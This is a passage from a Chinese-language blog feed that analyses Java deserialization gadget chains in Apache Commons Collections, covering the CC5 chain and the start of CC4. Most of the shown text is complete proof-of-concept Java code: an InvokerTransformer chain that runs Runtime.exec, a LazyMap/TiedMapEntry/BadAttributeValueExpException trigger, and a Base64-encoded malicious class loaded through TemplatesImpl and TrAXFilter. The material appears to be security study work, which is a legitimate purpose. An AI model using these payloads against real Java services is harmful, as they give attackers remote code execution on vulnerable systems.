class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chained</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        Map map=LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(),chained);</span><br><span class="line">        TiedMapEntry tie=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(map, chained);</span><br><span class="line">        BadAttributeValueExpException bad=<span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        Field filed=bad.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        filed.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        filed.set(bad,tie);</span><br><span class="line"></span><br><span class="line">        serialize(bad);</span><br><span class="line">        unserialize();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;E:\\study\\web\\java\\test.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(out);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        FileInputStream in=<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;E:\\study\\web\\java\\test.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(in);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完整利用链：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream -&gt; readObject()</span><br><span class="line">BadAttributeValueExpException -&gt; readObject()</span><br><span class="line">TiedMapEntry -&gt; toString()</span><br><span class="line">TiedMapEntry -&gt; getValue()</span><br><span class="line">LazyMap -&gt; get()</span><br><span class="line">ChainedTransformer -&gt; transform()</span><br><span class="line">ConstantTransformer -&gt; transform()</span><br><span class="line">InvokerTransformer -&gt; transform()</span><br><span class="line">Class.getMethod()</span><br><span class="line">InvokerTransformer -&gt; transform()</span><br><span class="line">Runtime.getRuntime()</span><br><span class="line">InvokerTransformer -&gt; transform()</span><br><span class="line">Runtime.exec()</span><br></pre></td></tr></table></figure><h3 id="配合TemplatesImpl加载字节码"><a href="#配合TemplatesImpl加载字节码" class="headerlink" title="配合TemplatesImpl加载字节码"></a>配合TemplatesImpl加载字节码</h3><p>直接用TemplatesImpl.newTransformer()方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.FactoryTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAGTGV2aWw7AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEABGV2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAKAAQACwANAAwACwAAAAwAAQAAAA4ADAANAAAADgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAAQAAsAAAAgAAMAAAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAEAAAAAbEAAAACAAoAAAAGAAEAAAATAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZAAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">Impl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setValue(Impl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;b1uel0n3&quot;</span>);</span><br><span class="line">        setValue(Impl,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        setValue(Impl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        setValue(Impl,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Impl),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chained</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        Map map=LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(),chained);</span><br><span class="line">        TiedMapEntry tie=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(map, chained);</span><br><span class="line">        BadAttributeValueExpException bad=<span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        setValue(bad,<span class="string">&quot;val&quot;</span>,tie);</span><br><span class="line"></span><br><span class="line">        serialize(bad);</span><br><span class="line">        unserialize();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;E:\\study\\web\\java\\test.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(out);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        FileInputStream in=<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;E:\\study\\web\\java\\test.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(in);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String filedname, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Field field=obj.getClass().getDeclaredField(filedname);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/archives/44c0d2d8/image-20250706220634535.png" alt="image-20250706220634535"></p><p>利用TrAXFilter构造方法调用TemplatesImpl.newTransformer()：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAGTGV2aWw7AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEABGV2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAKAAQACwANAAwACwAAAAwAAQAAAA4ADAANAAAADgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAAQAAsAAAAgAAMAAAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAEAAAAAbEAAAACAAoAAAAGAAEAAAATAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZAAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">Impl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setValue(Impl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;b1uel0n3&quot;</span>);</span><br><span class="line">        setValue(Impl,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        setValue(Impl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        setValue(Impl,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;Impl&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chained</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        Map map=LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(),chained);</span><br><span class="line">        TiedMapEntry tie=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(map, chained);</span><br><span class="line">        BadAttributeValueExpException bad=<span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        setValue(bad,<span class="string">&quot;val&quot;</span>,tie);</span><br><span class="line"></span><br><span class="line">        serialize(bad);</span><br><span class="line">        unserialize();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;E:\\study\\web\\java\\test.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(out);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        FileInputStream in=<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;E:\\study\\web\\java\\test.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(in);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String filedname, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Field field=obj.getClass().getDeclaredField(filedname);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/archives/44c0d2d8/image-20250706221555097.png" alt="image-20250706221555097"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://nivi4.notion.site/Java-CommonCollections5-f8fd6a9220de46b7954664bb97109d9f">https://nivi4.notion.site/Java-CommonCollections5-f8fd6a9220de46b7954664bb97109d9f</a></p><p><a href="https://nivi4.notion.site/Java-CommonCollections5-f8fd6a9220de46b7954664bb97109d9f">https://nivi4.notion.site/Java-CommonCollections5-f8fd6a9220de46b7954664bb97109d9f</a></p><p><a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections5.java">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections5.java</a></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> java安全 </category>
          
          <category> CC链 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CC5 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反序列化：CC4利用链深度解析</title>
      <link href="/archives/53e8b618/"/>
      <url>/archives/53e8b618/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>针对common-collections4，ysoserial也是给出了两条反序列化调用链，一个是我们前文分析的CC2，另一个就是本文分析的CC4。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul><li><strong>jdk 8u71</strong></li><li><strong>commons-collections-4.0</strong></li></ul><h2 id="CC4分析"><a href="#CC4分析" class="headerlink" title="CC4分析"></a>CC4分析</h2><p>其实CC4链就是将CC2链中的InvokerTransformer调用TemplatesImpl.newTransformer()方法换成了InstantiateTransformer来加载字节码，具体原理可以看我之前CC3链分析。</p><p>大致就是TrAXFilter的构造方法能调用templates.newTransformer()：</p><p><img src="/archives/53e8b618/image-20250705180557924.png" alt="image-20250705180557924"></p><p>而InstantiateTransformer重写的transform方法中能获取类的构造方法方法并创建实例：</p><p><img src="/archives/53e8b618/image-20250705180819239.png" alt="image-20250705180819239"></p><p>所以iArgs和iParamTypes都是我们可控的，可以通过将该方法来执行我们的TemplatesImpl.newTransfomer()方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">正常写法：</span><br><span class="line">Constructor con=TrAXFilter.class.getConstructor(Templates.class);</span><br><span class="line">con.newInstance(Impl);</span><br><span class="line"></span><br><span class="line">ChainedTransformer链写法：</span><br><span class="line">ConstantTransformer trAX=<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class);</span><br><span class="line">InstantiateTransformer con=<span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;Impl&#125;);</span><br><span class="line">Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;trAX,con&#125;;</span><br><span class="line">ChainedTransformer chaind=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">chaind.transform(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure><p>前面调用ChainedTransformer.transform方法也是一样的，即通过TransformingComparator.compare()调用</p><p>完整poc：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span 